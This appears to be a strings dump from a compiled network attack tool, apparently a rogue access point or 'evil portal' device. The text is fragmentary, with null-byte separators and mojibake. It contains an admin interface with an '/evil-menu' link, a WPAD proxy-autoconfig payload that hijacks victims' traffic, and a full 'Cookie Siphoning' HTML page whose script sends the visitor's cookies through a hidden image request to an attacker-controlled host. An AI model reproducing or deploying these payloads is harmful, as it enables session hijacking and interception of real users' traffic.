kground:linear-gradient(135deg,var(--acc),#6ad9ff);color:#0b1020;font-weight:600}␀␀␀␀.btn.g{border-color:transparent;background:linear-gradient(135deg,var(--acc2),#41e18d);color:#0b1020;font-weight:600}␀␀␀.btn:hover{transform:translateY(-1px);background:rgba(255,255,255,.10);border-color:rgba(255,255,255,.18)}␀␀.row{display:flex;gap:10px;flex-wrap:wrap;margin:8px 0}␀input,select,textarea{width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(255,255,255,.18);background:rgba(255,255,255,.06);color:var(--txt);outline:none}␀␀␀␀@media(prefers-color-scheme:light){input,select,textarea{background:#fff;border-color:#d5d5d5;color:#0e1730}}␀␀␀select option{color:#0e1730;background:#fff}␀␀␀␀textarea{min-height:320px}␀␀table{width:100%;border-collapse:separate;border-spacing:0;background:rgba(255,255,255,.04);border:1px solid var(--st);border-radius:12px;overflow:hidden}␀␀th{background:rgba(255,255,255,.08);font-weight:650}␀␀␀␀th,td{border-bottom:1px solid var(--st);padding:10px 12px;text-align:left}␀␀tr:nth-child(even) td{background:rgba(255,255,255,.03)}␀tr:last-child td{border-bottom:none}␀␀␀␀ul{list-style:none;padding:0;margin:0}li{padding:8px 10px;border:1px solid var(--st);border-radius:10px;margin:8px 0;background:rgba(255,255,255,.06)}li a{color:var(--txt);text-decoration:none}␀␀␀.actions{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0}␀␀␀␀.mut{color:var(--mut)}.right{margin-left:auto}␀␀.scroll-x{width:100%;overflow:auto;-webkit-overflow-scrolling:touch}␀␀␀␀table.wide{min-width:720px}␀table.wide th,table.wide td{white-space:nowrap}␀#dropZone{width:100%;padding:16px;border:1px dashed var(--acc);border-radius:12px;color:var(--acc);background:rgba(76,125,255,.10);cursor:pointer;transition:.18s}␀␀#dropZone.dragover{background:rgba(76,125,255,.18)}␀#fileList{font-size:13px;max-height:220px;overflow:auto}␀␀␀␀#progressBar{width:100%;height:10px;background:rgba(255,255,255,.12);border-radius:6px;overflow:hidden}␀#progressFill{height:100%;width:0%;background:linear-gradient(135deg,var(--acc),#6ad9ff)}␀␀␀#doneBox{display:none;margin-top:10px;padding:10px;background:linear-gradient(135deg,var(--acc2),#41e18d);color:#0b1020;border-radius:10px;font-size:13px;font-weight:600}␀␀</style><body><div class="wrap"><div class="hd"><div><h2 class="tt">␀␀␀␀</h2><p class="sub">Admin â€¢ Unified UI</p></div><div class="right"><a class="btn" href="/evil-menu">Menu</a></div></div><div class="ct">␀␀</div></div></body></html>␀␀%s<%02X>␀␀␀␀basic_string::_M_create␀<?xml version="1.0"?><scpd xmlns="urn:schemas-upnp-org:service-1-0"><specVersion><major>1</major><minor>0</minor></specVersion><actionList/><serviceStateTable/></scpd>␀text/xml; charset="utf-8"␀␀␀Location␀␀␀␀text/html␀␀␀text/plain␀␀<html><body><p>Not found.</p></body></html>␀running␀/evil-menu␀␀function FindProxyForURL(url, host) { return "PROXY ␀␀␀␀:80; DIRECT"; }␀application/x-ns-proxy-autoconfig␀␀␀[+] WPAD sent with proxy ␀␀␀:80␀&amp;␀␀␀&lt;␀␀␀␀&gt;␀␀␀␀&quot;␀␀&#39;␀␀␀\"␀␀\\␀␀\n␀␀\r␀␀\t␀␀
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Cookie Siphoning</title>
  </head>
  <body>
    <script>
      document.addEventListener("DOMContentLoaded", function() {
        try {
          const cookies = document.cookie;
          if (cookies) {
            const img = document.createElement('img');
            img.style.display = 'none';
            img.src = `http://${encodeURIComponent('␀␀UnknownDomain␀␀␀')}/logcookie?cookies=${encodeURIComponent(cookies)}&domain=${encodeURIComponent('␀␀')}`;
            document.body.appendChild(img);
          }
        } catch (error) {
          console.error('Error siphoning cookies:', error);
        }
      });
    </script>
  </body>
</html>
